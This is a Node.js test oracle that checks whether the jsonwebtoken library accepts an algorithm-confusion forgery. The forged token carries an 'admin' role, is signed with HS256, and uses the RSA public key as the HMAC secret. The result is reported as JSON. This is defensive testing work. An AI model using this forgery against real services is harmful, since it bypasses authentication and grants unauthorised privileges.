'use strict';
const jwt = require('jsonwebtoken');
const crypto = require('node:crypto');

function main() {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  try {
    const marker = 'JWT_ORACLE_' + Date.now() + '_' + Math.random().toString(36).slice(2);

    // Generate an RSA keypair. The server in this scenario intends to issue
    // and verify RS256 tokens using this keypair, and passes the PUBLIC key
    // as the "secret" to jwt.verify() (a very common real-world pattern:
    // verify(token, publicKey) without pinning `algorithms: ['RS256']`).
    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
      modulusLength: 2048,
      publicKeyEncoding: { type: 'spki', format: 'pem' },
      privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
    });

    // --- Benign operation first: sign with RS256 using the private key,
    // verify with the public key (no algorithms restriction supplied,
    // mirroring typical misconfigured-but-functional usage). ---
    const benignToken = jwt.sign({ marker, role: 'user' }, privateKey, { algorithm: 'RS256' });
    const benignDecoded = jwt.verify(benignToken, publicKey);

    if (!benignDecoded || benignDecoded.marker !== marker || benignDecoded.role !== 'user') {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'Benign RS256 sign/verify roundtrip failed to produce expected payload.'
      }));
      return;
    }

    operation_completed = true;

    // --- Malicious attempt: algorithm confusion attack. ---
    // An attacker who only knows the PUBLIC key (which is, by design, public)
    // forges a token by signing it with HS256, using the public key PEM
    // string itself as the HMAC secret. If the verifier calls
    // jwt.verify(token, publicKey) without restricting `algorithms` to
    // ['RS256'], and the library's default algorithm inference does not
    // safely exclude HMAC algorithms when given an asymmetric key, the
    // forged token will be accepted, allowing full signature bypass /
    // privilege escalation (role: 'admin').
    const forgedToken = jwt.sign({ marker, role: 'admin' }, publicKey, { algorithm: 'HS256' });

    try {
      const forgedDecoded = jwt.verify(forgedToken, publicKey);

      if (forgedDecoded && forgedDecoded.marker === marker && forgedDecoded.role === 'admin') {
        exploit_succeeded = true;
        evidence = 'jwt.verify() accepted an HS256 token forged using the RSA public key as HMAC secret (key-confusion attack), decoding payload: ' + JSON.stringify(forgedDecoded);
      } else {
        exploit_succeeded = false;
        evidence = 'jwt.verify() returned an unexpected result for forged key-confusion token: ' + JSON.stringify(forgedDecoded);
      }
    } catch (verifyErr) {
      exploit_succeeded = false;
      evidence = 'Forged HS256 (key-confusion) token was rejected by jwt.verify(): ' + (verifyErr && verifyErr.message ? verifyErr.message : String(verifyErr));
    }

    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed,
      exploit_succeeded,
      evidence
    }));
  } catch (err) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Unexpected exception: ' + (err && err.message ? err.message : String(err))
    }));
  }
}

main();
